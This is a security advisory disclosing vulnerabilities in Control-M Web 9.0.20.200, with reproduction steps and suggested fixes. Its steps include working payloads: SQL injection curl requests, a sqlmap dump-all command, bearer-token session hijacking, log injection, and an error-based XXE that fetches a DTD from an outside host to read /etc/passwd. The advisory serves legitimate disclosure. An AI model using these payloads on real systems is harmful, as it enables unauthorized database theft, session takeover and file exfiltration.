---
title: Control-M Web Security Advisory
---

All tests were performed on version 9.0.20.200 of Control-M Web.

By combining 1 with (2,3) or 1 with 4, an unauthenticated attacker can take over the Control-M web console and execute unrestricted code on all agents.

Combining the last three vulnerabilites permits an authenticated low-privileged user to escalate privileges to admin.


CRITICAL: Unauthenticated SQL injection in Reports
==================================================
The ```getUsersForSharedReport``` endpoint is vulnerable to an unauthenticated sql injection. The ```report-id``` parameter is not sanitized and a SQL query is constructed by concatenation using this parameter.

Reproducing:
```
curl -k 'https://xx.xx.xx.xx/RF-Server/report/getUsersForSharedReport?report-id=1' -H 'user-id: abc' && echo
[]

curl -k "https://xx.xx.xx.xx/RF-Server/report/getUsersForSharedReport?report-id=1'%20OR%201=1%20--%20-" -H 'user-id: abc' && echo
["ALL"]
```

Automation with sqlmap:
```
sqlmap -u "https://xx.xx.xx.xx/RF-Server/report/getUsersForSharedReport?report-id=1" --header 'user-id: abc' --dump-all
```

Suggested fixes:

* Require authentication for all endpoints. Have a CI/CD procedure in place to detect unauthenticated endpoints.
* Sanitize all parameters using strong typing, a whitelist or a regular expression.
* Convert all queries to parameterized queries and enforce this in CI/CD.


MEDIUM: Use of a deprecated hashing algorithm
=============================================
For local authentication, passwords are stored hashed using SHA512. This algorithm is not suitable for password storage as it incorporates no salt and no work factor.

Local passwords are stored in the ```generalauthorizations``` table.

Suggested fix: use bcrypt or equivalent.


MEDIUM: Weak password requirements
==================================
The minimum length of a local password is 6. There are no other requirements. This enables attackers that have compromised the database to quickly crack passwords offline.

Suggested fix: have a minium length of 12 as well as complexity requirements.


HIGH: Session tokens are stored in plaintext in the database
============================================================
The tokens used to authenticate user are stored in plaintext in the table ```active_users```.

Example record retrieved using sqlmap (some values have been redacted):
```
authname,hostname,klive_ts,logon_ts,username,clientver,usertoken,authgroups,clienttype,internaltype,additionaldata,grpsauthrecord,systemusername,timeoutseconds,userauthrecord,alternateusertoken
<username>,<fqdn>,690287668,690274165,<username>,9.0.20.200,54BAE11F47BE4D48690EC00F5788551594C0B96D8B8F96B5D562EFA1802B4A91BB2F98F50152DD16D741E6C667EB47620452529DB2B436BBEF2F02FFC81CBA95,AdminGroup,GUI,NA,<blank>,base64:eyIxIjp7ImxzdCI6WyJyZWMiLDEseyI...,emuser,600,base64:eyIxIjp7InJlYy...,54BAE11F47BE4D48690EC00F5788551594C0B96D8B8F96B5D562EFA1802B4A91BB2F98F50152DD16D741E6C667EB47620452529DB2B436BBEF2F02FFC81CBA95
```

Using this token, the user session can be hijacked to access all URLs:
```
curl -i -k 'https://xx.xx.xx.xx/ControlM/rest/site-customizations' && echo
HTTP/1.1 401
{
  "error": "No login information was provided"
}

curl -i -k 'https://xx.xx.xx.xx/ControlM/rest/site-customizations' -H 'Authorization: Bearer 54BAE11F47BE4D48690EC00F5788551594C0B96D8B8F96B5D562EFA1802B4A91BB2F98F50152DD16D741E6C667EB47620452529DB2B436BBEF2F02FFC81CBA95' && echo
HTTP/1.1 200
[
  {
    "id": 1000,
    "name": "Full view (includes Planning, Monitoring, MFT, Tools)",
    "description": "Includes all of the domains and their elements selected by default. You cannot delete or edit this user view.",
    "createdTime": "2019-01-01T17:01:15.000Z",
    "username": "",
    "enabled": false
  },
...
```

Suggested fix: The bearer token mechanism here seems ill-suited to communicate with backends, this is generally done using JWT (stateless) or sessions (stateful). As it is equivalent to a password, if the bearer token is stored server-side it should be hashed (or kept in memory). In this case the authentication scheme will probably need to be adapted to include the username. Or it could be replaced altogether.

HIGH: Unauthenticated file write and path traversal
===================================================
The POST handler of the ```/apps``` endpoint of the Application Integrator service constructs a path using the variable ```Name``` from the user's request. It does so before checking the user's authentication.

It is therefore possible for an unauthenticated user to write out of the expected ```AIRepo``` folder.

Exploitation is not trivial:

* the ```Name``` is used twice to construct the path which limits the folders that can be written to
* there is no control over the file extension
* there is partial control over the file contents
* writes to the filesystem are limited to webserver's lowpriv user (emuser)

However it shouldn't be ruled out, there's a possibility that RCE could be achieved especially since Tomcat is configured to autodeploy.


MEDIUM: Unauthenticated Denial of Service
=========================================
The DELETE handler of the ```/apps/<appName>``` endpoint of the Application Integrator service is unauthenticated and could be used to cause a denial of service.

It can be used to delete any directory (and files contained within) of the filesystem because of a path traversal vulnerability.


LOW: Denial of Service
======================
The POST handler of the ```/undeployAppfromAll``` endpoint of the Application Integrator service could be used to cause a denial of service.

It can be used to delete any xml file of the filesystem because of a path traversal vulnerability.


LOW: Log injection
==================
The newline character isn't escaped in logs. This lets unauthenticated attackers inject logs:

```
curl 'https://xx.xx.xx.xx/RF-Server/report/validateReport' -X POST -H 'Content-Type: application/json' -d '{
2023-08-01 17:35:44,509 INFO [qtp1754444726-92] (ReportApi:639) FAKELOG
}'
```

Produces:
```
2023-08-01 17:36:36,043 INFO [qtp1754444726-92] (ReportApi:639) - Validation report json={
2023-08-01 17:35:44,509 INFO [qtp1754444726-92] (ReportApi:639) FAKELOG
}
```


MEDIUM: Client-side user permissions
====================================
Control-M Web Application Integrator sends a numeric value after a user successfully logs in:
```
POST /aisrv/login/login/ HTTP/1.1
...
HTTP/1.1 200
2
```

This ```userLevel``` value is used by the web browser to handle rights:
```
<button class="btn btn-default" ng-disabled="userLevel < 3" ng-click="savePlugin(plugin)" disabled="disabled">
    <div>
        <img src="img/icons/Save32.png">
    </div>
    Save
</button>
```

By intercepting the server's response and changing the numeric value to a higher value, all options become available in the web interface. There were no server-side checks for all operations tested (save, deploy...).


HIGH: Authenticated XXE
=======================
The ```wsdl``` endpoint of Control-M Web Application Integrator is vulnerable to a XXE attack when parsing the XML file. This indicates the use of an unsecured XML parser that allows DTDs.

Moreover it is exploitable in an error-based fashion, which is the most profitable case as it permits to both list the filesystem and retrieve individual files.

xxe.xml:
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % asd SYSTEM "http://xx.xx.xx.xx:8080/xxe.dtd"> %asd; %c;]>
<foo>&rrr;</foo>
```

xxe.dtd:
```
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c '<!ENTITY rrr SYSTEM "file:///nofile:%d;">'>
```

Request:
```
https://yy.yy.yy.yy/aisrv/wsdl/?wsdlLocString=http:%2F%2Fxx.xx.xx.xx:8080%2Fxxe.xml
```

Response:
```
Can't parse wsdl:java.io.FileNotFoundException: /nofile:root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4: ... (No such file or directory)
```


HIGH: Secrets in logs
=====================
On all Control-M Web applications the logs contain the user's tokens. Getting access to these logs permits session hijacking.

For instance this is what is logged when a user authenticates:
```
2023-08-02 09:35:43,157 INFO [http-nio-127.0.0.1-49095-exec-5] (ThriftClient.java:325) - getAuthorization for AI_ACCESS_PRIV_TYPE BROWSE_ACCESS
2023-08-02 09:35:43,157 INFO [http-nio-127.0.0.1-49095-exec-5] (LoginController.java:841) - AUTHLEVEL: 2
2023-08-02 09:35:43,157 INFO [http-nio-127.0.0.1-49095-exec-5] (LoginController.java:1033) - addTokenCookieAndHeader
2023-08-02 09:35:43,157 INFO [http-nio-127.0.0.1-49095-exec-5] (LoginController.java:849) - new login token: D23D0E4B874359FE0B36A4919119B479F0FCA4CBCB67D3A01ED4B058D9CDA8D0C93DD4D87E68DA25E734FCE3AC2A605982C177BEB8D5AFD4D6008881B70E8D13
2023-08-02 09:35:43,158 INFO [http-nio-127.0.0.1-49095-exec-5] (ThriftUtil.java:29) - setSession: D23D0E4B874359FE0B36A4919119B479F0FCA4CBCB67D3A01ED4B058D9CDA8D0C93DD4D87E68DA25E734FCE3AC2A605982C177BEB8D5AFD4D6008881B70E8D13
```

The token can be reused in a header to authenticate to the services. The name of the header might vary (EM_TOKEN or X-XSRF-TOKEN), but the token grants access to each web service.

